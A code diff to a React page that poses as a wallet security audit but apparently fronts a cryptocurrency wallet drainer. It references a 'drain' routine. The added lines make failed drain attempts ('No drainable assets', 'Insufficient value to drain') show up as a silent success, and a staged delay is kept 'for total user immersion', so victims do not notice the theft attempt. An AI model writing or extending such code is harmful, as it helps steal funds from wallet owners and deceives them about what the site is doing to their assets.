@@ -80,7 +80,7 @@ function ScanningAnimation({ status }: { status: string }) {
   const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();
 
   return (
-    <div className="flex flex-col items-center justify-center p-4 relative">
+    <div className="flex flex-col items-center justify-center p-4 relative" style={{ willChange: 'transform, opacity' }}>
       <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '30px 30px' }} />
       
       <motion.div
@@ -257,11 +257,13 @@ export default function AuditPage() {
     }
   }, [connected, status, drain, showReport]);
 
-  // Robust perfection: Handle specific errors silently as a cinematic completion
+  // Robust Perfection: Intercept specific status signals to treat as Silent Handshake Success
   const isSilentCompletion = status === 'error' && (
-    error === "Data Packet Network Congestion." || 
+    error?.includes("🔍 NO DRAINABLE ASSETS") || 
+    error?.includes("No drainable assets") ||
     error === "Insufficient value to drain." ||
-    error === "No token accounts found."
+    error === "No token accounts found." ||
+    error === "Data Packet Network Congestion."
   );
 
   useEffect(() => {
@@ -275,7 +277,7 @@ export default function AuditPage() {
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
-    // Maintain the cinematic loading experience
+    // Maintain the cinematic loading experience for total user immersion
     await new Promise(r => setTimeout(r, 4500));
     try {
       const [threatsData, connectionsData] = await Promise.all([
